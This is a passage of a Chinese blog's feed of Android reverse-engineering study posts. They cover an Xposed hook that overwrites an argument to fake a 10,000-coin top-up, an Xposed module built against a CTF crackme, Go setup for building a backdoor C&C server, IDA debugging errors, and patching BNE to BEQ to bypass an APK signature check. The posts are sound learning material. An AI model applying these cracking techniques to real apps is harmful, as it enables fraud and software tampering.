class="type">int</span>.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        param.args[<span class="number">2</span>] = <span class="number">9999</span>; <span class="comment">//修改第三个参数</span></span><br><span class="line">                        Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;成功充值一万金币&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">&quot;substring&quot;</span>,</span><br><span class="line">                <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">int</span>.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.i(<span class="string">&quot;HookWork&quot;</span>,<span class="string">&quot;substring的返回值为&quot;</span>+param.getResult().toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xposed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xposed模块开发入门</title>
      <link href="/Xposed-First-Hook.html"/>
      <url>/Xposed-First-Hook.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://yuanfentiank789.github.io/2017/04/01/xposeddev/">https://yuanfentiank789.github.io/2017/04/01/xposeddev/</a></p></blockquote><p>原文章是从Xposed作者github上翻译过来的，但是其中一些内容在新版本的Android studio中不再适用，我将结合自己实践对原文进行补充。</p><h3 id="Method-hooking-replacing"><a href="#Method-hooking-replacing" class="headerlink" title="Method hooking/replacing"></a>Method hooking/replacing</h3><p>Xposed真正强大的地方在于对Method调用的hook，如果通过反编译来验证逻辑猜想的话，只能多次的反编译代码，修改代码，重新签名打包来完成。而使用Xposed的hook功能，不用修改apk方法中的代码，通过再目标method前后插入要执行的代码即可，method是java中最小的执行单元。</p><h3 id="创建project"><a href="#创建project" class="headerlink" title="创建project"></a>创建project</h3><p>一个xposed module本质上是一个普通的Android app，只是多了几个meta data和文件而已。因此，首先创建一个普通的Android project，sdk版本选择4.0.3（API 15）以上，因为module没有界面，因此不必要创建activity，这时，应该已经创建好了一个空的Android project。</p><p>但是不创建activity将无法安装到模拟器上，建议还是创建一个empty activity</p><p>接下来把上一步刚创建好的project改造成可以被Xposed加载的module，分为以下几个步骤：</p><h3 id="添加Xposed-Framework-API到project"><a href="#添加Xposed-Framework-API到project" class="headerlink" title="添加Xposed Framework API到project"></a>添加Xposed Framework API到project</h3><p>在<a href="https://bintray.com/rovo89/de.robv.android.xposed/api%E4%B8%8B%E8%BD%BD%E7%9B%B8%E5%BA%94%E7%9A%84api%EF%BC%8C%E6%94%BE%E5%88%B0%E9%A1%B9%E7%9B%AE%E7%9A%84libs%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%9C%A8app/build.gradle%E4%B8%AD%E5%BC%95%E5%85%A5%E3%80%82">https://bintray.com/rovo89/de.robv.android.xposed/api下载相应的api，放到项目的libs文件夹下，并在app/build.gradle中引入。</a></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20201202162922671.png" alt="image-20201202162922671"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    compileOnly <span class="string">&#x27;de.robv.android.xposed:api:82&#x27;</span></span><br><span class="line">    compileOnly <span class="string">&#x27;de.robv.android.xposed:api:82:sources&#x27;</span></span><br><span class="line">    <span class="comment">//implementation fileTree(dir: &quot;libs&quot;, include: [&quot;*.jar&quot;])</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.2.0&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.3.0&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*<em>将implementation fileTree(dir: “libs”, include: [“</em>.jar”])这行注释掉，否则构建项目时会失败**</p><p>需要注意的是，这里是有provide而不是compile。如果使用compile，api库的classes将会被打包到apk中，会导致bug，特别是在Android 4.x设备上。使用provided只是让module可以通过编译，在apk中只有对api的引用，真正的实现在由运行设备的Xposed Framework提供。<strong>新版本的Android Studio中provide被compileOnly代替。</strong></p><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>Xposed Installer能列出系统已经安装的module，是因为它通过application中一个特殊的meta flag来识别。到AndroidManifest.xml =&gt; Application =&gt; Application Nodes (at the bottom) =&gt; Add =&gt; Meta Data.在Application节点底部添加几个meta data.</p><ol><li>name:xposedmodule,value:true;</li><li>name:xposedminversion,value:上一节获得的API version；</li><li>name:xposeddescription,value:module简单的描述</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.luckyfuture.firsthook&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;Hook AliCrackme的模块&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;53&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Module实现"><a href="#Module实现" class="headerlink" title="Module实现"></a>Module实现</h3><p>以<a href="http://blog.llloverr.com/index.php/archives/21/%E4%B8%AD%E7%9C%8B%E9%9B%AActf%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%BA%E4%BE%8B">http://blog.llloverr.com/index.php/archives/21/中看雪ctf的一道题目为例</a></p><p>新建一个class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.luckyfuture.firsthook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Start</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.ctf.test.ctf_100&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Find target app:&quot;</span>+lpparam.packageName);</span><br><span class="line">        <span class="comment">//确定要拦截的进程com.ctf.test.ctf_100</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="assets-xposed-init"><a href="#assets-xposed-init" class="headerlink" title="assets/xposed_init"></a>assets/xposed_init</h3><p>最后要做的一件事是告诉XposedBridge那个class包含hook入口，通过一个叫xposed_init的文件。在asset目录下新建这个文件，该文件每行包含一个class的全限定名，在这里是：com.luckyfuture.firsthook.Start。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2020/12/image-20201201171030739.png" alt="image-20201201171030739"></p><h3 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h3><p>保存上述修改，运行这个application，因为是首次安装这个module，需要首先打开Xposed Installer激活。在Modules tab找到刚安装的module，激活，重启设备.通过logcat观察输出</p>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xposed </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言windows编译环境配置详解</title>
      <link href="/golang-env-in-windows.html"/>
      <url>/golang-env-in-windows.html</url>
      
        <content type="html"><![CDATA[<h3 id="Go下载安装"><a href="#Go下载安装" class="headerlink" title="Go下载安装"></a>Go下载安装</h3><p>官方Go下载站点：<a href="https://golang.google.cn/">https://golang.google.cn/</a></p><p>下载Windows版后直接运行即可</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>Go只需要配置两个环境变量</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326084806222.png" alt="image-20210326084806222"></p><ul><li>GOROOT是Go语言的安装目录</li><li>GOPATH是平常使用Go语言的工作区根目录</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326085017968.png" alt="image-20210326085017968"></p><p><code>GOPATH</code>是Go语言的工作目录。<br>go install/go get和 go的工具等会用到GOPATH环境变量。<br>GOPATH是作为编译后二进制的存放目的地和import包时的搜索路径。<br>GOPATH主要包含三个目录: <code>bin</code>、<code>pkg</code>、<code>src</code></p><ul><li>bin：主要存放可执行文件。</li><li>pkg：存放编译好的库文件, 主要是*.a文件。</li><li>src：下主要存放go的源文件。</li></ul><h3 id="配置GOPROXY代理"><a href="#配置GOPROXY代理" class="headerlink" title="配置GOPROXY代理"></a>配置GOPROXY代理</h3><p>因为众所周知的原因，使用代理才能获得更好的体验，打开power shell运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure><hr><p>在命令行输入 go env 查看目前的配置信息</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326085926574.png" alt="image-20210326085926574"></p><p>基本的配置已经完成，下面开始讲go运行编译中的坑。</p><h3 id="工作区-amp-非工作区"><a href="#工作区-amp-非工作区" class="headerlink" title="工作区&amp;非工作区"></a>工作区&amp;非工作区</h3><p>go工作区是指GOPATH中src目录下，除此以外的其它目录都是非工作区</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326090719985.png" alt="image-20210326090719985"></p><p>在任何地方可以使用go run和go build命令，无论工作区或非工作区。简单的使用不用做区分。</p><h3 id="外部包引用"><a href="#外部包引用" class="headerlink" title="外部包引用"></a>外部包引用</h3><p>初次使用go我遇到一个问题，hello world可以编译运行，但是运行import中从github引入的包的代码时就会出错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot find package &quot;github.com/xxxx/xxxxx&quot; in any of:</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326094540556.png" alt="image-20210326091656975"></p><p>此时使用go get命令安装包，可以在GOPATH目录下找到包，但是运行时仍提示找不到package。经过我的研究，终于明白了go的编译原理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\94323&gt; go env</span><br><span class="line">set GO111MODULE=on</span><br></pre></td></tr></table></figure><p>问题出在 GO111MODULE的配置上，<strong>当这个值为on时</strong>，go get下载的包在GOPATH的pkg/mod目录下，此时运行go代码还需要一个go.mod文件，帮助编译器找到包。如果没有这个文件，则会因为找不到包一直报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no required module provides package github.com/axgle/mahonia: go.mod file not found in current directory or any parent directory; see &#x27;go help modules&#x27;</span><br></pre></td></tr></table></figure><p>此时正确的做法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS D:\GitHub\GoProject\src&gt; go mod init testname</span><br><span class="line">go: creating new go.mod: module testname</span><br><span class="line">go: to add module requirements and sums:</span><br><span class="line">        go mod tidy</span><br></pre></td></tr></table></figure><p>testname为项目名字，可以自己设置，与go文件名或代码中的package没有关系</p><p>随后运行 go mod tidy 命令，go会自动发现代码中引入的包并下载。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326101536516.png" alt="image-20210326101536516"></p><p>此时再查看go.mod中内容，相关外部包已经在其中</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326094807747.png" alt="image-20210326094807747"></p><p>最后运行go build，编译成功</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326094855869.png" alt="image-20210326094855869"></p><p>go.mod文件原则上是不需要手动维护的。关于go.mod的更多信息<a href="https://blog.csdn.net/weixin_39003229/article/details/97638573">https://blog.csdn.net/weixin_39003229/article/details/97638573</a></p><hr><p>当GO111MODULE的值为off时，使用go get下载的包会直接在当前目录下，并且在非工作区编译会出现诸多问题，所以推荐将GO111MODULE值设置为on。使用go mod命令管理外部包引用。</p><h3 id="自定义包引用"><a href="#自定义包引用" class="headerlink" title="自定义包引用"></a>自定义包引用</h3><p>从网上下载别人的代码会出现代码中引入本地自定义包，以及外部包和本地包同时引用的情况</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210326100942487.png" alt="image-20210326100942487"></p><p>这时的编译方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS D:\GitHub\C&amp;C\command-control-final\server&gt; go mod init sec-dev-in-action-src/backdoor/command-control/command-control-final/server</span><br><span class="line">go: creating new go.mod: module sec-dev-in-action-src/backdoor/command-control/command-control-final/server</span><br><span class="line">go: to add module requirements and sums:</span><br><span class="line">        go mod tidy</span><br></pre></td></tr></table></figure><p>观察代码中引用的包名，目录结构，和我生成的go.mod module名称，相信大家一定看出其中的端倪了</p><p>之后运行go mod tidy，再次go build即可。</p><hr><p>以上就是go语言在Windows下编译运行环境配置的详细教程了。如果有其他问题可以在下方留言。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向学习-使用ida动态调试中的那些坑</title>
      <link href="/ida-learning.html"/>
      <url>/ida-learning.html</url>
      
        <content type="html"><![CDATA[<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205211719813.png" alt="image-20210205211719813"></p><p><a href="https://www.52pojie.cn/thread-742686-1-1.html">教程链接：《教我兄弟学Android逆向09 IDA动态破解登陆验证》</a></p><h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><blockquote><p>“./android_server”: error: Android 5.0 and later only support position-independent executables (-fPIE).</p></blockquote><p>Android5.0以上对于可执行文件加入了一个安全验证，如果你使用的是ida pro6.6及以下的版本，请更换新版ida pro \dbgsrv\android_server 程序。</p><p>我直接从吾爱论坛中下载了最新的<a href="https://down.52pojie.cn/Tools/Disassemblers/IDA_Pro_v7.5_Portable.zip">ida pro 7.5</a>安装时的注意事项使用说明中已经很详细了。解压后直接运行目录中的<code>IDA_Pro_7.5_绿化工具.exe</code>。</p><hr><p>使用新版ida pro中的android_server程序，可以在我的Android8.0手机上运行了。设置好端口转发，继续使用ida去连接。</p><p>点击Debugger选项，点击switch debugger，选择Remote ARM/Linux Android debugger</p><p>再配置process options</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205133115248.png" alt="image-20210205133115248"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205133441495.png" alt="image-20210205133441495"></p><p>之后点击attach process 就可以看到手机上正在运行的app进程</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205134435024.png" alt="image-20210205134435024"></p><blockquote><p>Warning: rpc: bad packet length<br>2021-02-05 13:03:34 [1] Accepting connection from 127.0.0.1…<br>2021-02-05 13:03:34 [1] [1] Incompatible IDA version</p></blockquote><p>这一步最好使用新版的ida 不然会出现如上报错，无法连接</p><hr><blockquote><p>ida pro 7.0 反编译 Android so 库后无法显示中文</p></blockquote><p>参照<a href="https://blog.csdn.net/fuchaosz/article/details/104827280%E8%AE%BE%E7%BD%AE%E5%8D%B3%E5%8F%AF">https://blog.csdn.net/fuchaosz/article/details/104827280设置即可</a></p><hr><blockquote><p>Failed to find data segment of /system/bin/linker</p><p>Illegal segment bitness.</p></blockquote><p>这条报错原因是用来测试的真机内核是64位的，，IDA里的android_server是32位的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205134822426.png" alt="image-20210205134822426"></p><p>将同目录下的android_server64传输到手机运行就好了。</p><hr><blockquote><p>armlinux debugger: more than one special register present</p></blockquote><p>这条报错我看网上的文章并不多，平常我使用的ida是32位的，更换64位的ida即可解决。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205135214822.png" alt="image-20210205135214822"></p><p>但是我不太清楚其中的原理，想来应该是32位和64位寄存器的数目不同。</p><hr><blockquote><p>modules中找不到libJniTest.so</p></blockquote><p>工具与环境上的问题都解决后，却发现我的modules里面没有教程说的libJniTest.so文件。这是由于手机未root权限不够的原因。我的设备是Google pixel 欧版，刷入magisk并root十分方便，可以参考这篇文章<a href="https://www.itfanr.cc/2018/10/16/google-pixel-unlock-bl-and-root/%E3%80%82%E5%85%B6%E5%AE%83%E6%9C%BA%E5%9E%8B%E8%AF%B7%E8%87%AA%E8%A1%8Croot%E5%90%8E%E5%B0%9D%E8%AF%95%E3%80%82">https://www.itfanr.cc/2018/10/16/google-pixel-unlock-bl-and-root/。其它机型请自行root后尝试。</a></p><hr><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210205135516011.png" alt="image-20210205135516011"></p><p><del>解决了以上问题终于可以使用ida愉快的进行调试了</del></p><p>当我好不容易进入调试界面，下断点运行程序，ida直接崩溃报start process failed错误。上网查资料显示，用了32位的库调试64位程序会出现这个问题。但是我选择调试armeabi-v7a文件夹下64位的so文件，仍然存在这个问题。下一步准备换ida的版本试一试，如果你知道解决方法可以在评论区告诉我。</p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA </tag>
            
            <tag> 动态调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向学习|对ARM指令的一次学习</title>
      <link href="/arm-instruction.html"/>
      <url>/arm-instruction.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/thread-732955-1-1.html">吾爱破解教程链接《教我兄弟学Android逆向08 IDA爆破签名验证》</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>IDA pro我之前接触过，但用它修改指令和数据还是第一次。通过上一篇教程，我知道了用ida修改so文件，实际上就是修改数据对应的HEX值。比如将hello 52pojie修改为hello world，就是将其对应的16进制修改。而在这篇爆破签名验证的教程中，需要我去修改CPU指令。原理和修改数据相同，也是修改指令对应的hex值，但不是字符串转换那么简单了。</p><h3 id="对ARM架构的CPU简单介绍"><a href="#对ARM架构的CPU简单介绍" class="headerlink" title="对ARM架构的CPU简单介绍"></a>对ARM架构的CPU简单介绍</h3><p>在开始之前有必要了解一下ARM架构CPU的知识。我们都知道pc领域cpu的老大是Intel，而移动设备cpu老大就是ARM。不同的cpu架构对应不同的指令集。Intel和ARM两大阵营还可以再细分。Intel的架构中<code>x86</code>代表32位cpu，<code>x86_64</code>代表64位的cpu，x86汇编语言学习最为普遍。ARM架构也有32位和64位之分。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203100254429.png" alt="image-20210203100254429"></p><p>在此例中，我们使用apktool对app进行反编译，lib下得到三个包含so的文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">armeabi     : 32位 arm cpu 库，几乎所有手机都支持</span><br><span class="line">armeabi-v7a : 64位 arm cpu 库，现在我们买的手机基本上都是64位的cpu了</span><br><span class="line">x86         : 在电脑上运行的模拟器或者基于Intel x86的平板电脑上用的</span><br></pre></td></tr></table></figure><p>这三个版本的库在指令上有多差别。作为初学者，我们选择 armeabi 下的 libJniTest.so 库作为研究对象，便于在网上查找资料。</p><blockquote><p>Google一开始就没把筹码都压在ARM上，Android1.6开始Dalvik虚拟机提供对x86的支持。Android4.1加入了对MIPS的支持。</p></blockquote><h3 id="修改指令：将-BNE-改为-BEQ"><a href="#修改指令：将-BNE-改为-BEQ" class="headerlink" title="修改指令：将 BNE 改为 BEQ"></a>修改指令：将 BNE 改为 BEQ</h3><p>根据教程一步步操作，来到了最关键的地方</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203103710704.png" alt="image-20210203103710704"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmp 是比较两个数是否相等</span><br><span class="line">loc_F62 代表的函数是 “签名不一致，退出程序”</span><br><span class="line">BNE 指不相等的时候跳转(branch not equal)</span><br><span class="line">BEQ 指相等的时候跳转(branch equal)</span><br></pre></td></tr></table></figure><p>搞清楚了逻辑，那么爆破这个apk的签名其实就是把 <code>BNE loc_F62</code> 改为 <code>BEQ loc_F62</code>，即签名一致则跳转到 loc_F62退出程序，我们的签名和作者签名一定不同，所以程序不会直接退出，爆破成功。</p><p>选中BNE指令来到hex dump视图，对应的16进制为10D1</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203104320113.png" alt="image-20210203104320113"></p><p>查看下方的BEQ指令来到hex dump视图，对应的16进制为09D0</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203104437676.png" alt="image-20210203104437676"></p><p>原教程中说将10D1改为10D0即完成了BNE到BEQ的修改，但是为什么这样修改呢？</p><h4 id="深入问题"><a href="#深入问题" class="headerlink" title="深入问题"></a>深入问题</h4><p>在《计算机组成原理》和《汇编语言》中，我们知道了计算机指令的组成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一条指令(32位) = 操作码(前16位)：操作数(后16位)</span><br></pre></td></tr></table></figure><p>操作码代表做哪些运算，例如：ADD、MOV、B 等等<br>操作数就代表被操作的数据，即可以是数据也可以是地址。</p><p>回到此例中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BNE loc_F62  对应机器码 10 D1 对应二进制 0001 0000 1101  0001</span><br><span class="line">BEQ loc_F74  对应机器码 09 D0 对应二进制 0000 1001 1101  0000</span><br></pre></td></tr></table></figure><p>哪几位对应指令，哪几位对应数据呢？我们再往下看。</p><p>查询arm的官方指令手册可以知道B（跳转指令的用法）</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203110514898.png" alt="image-20210203110514898"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 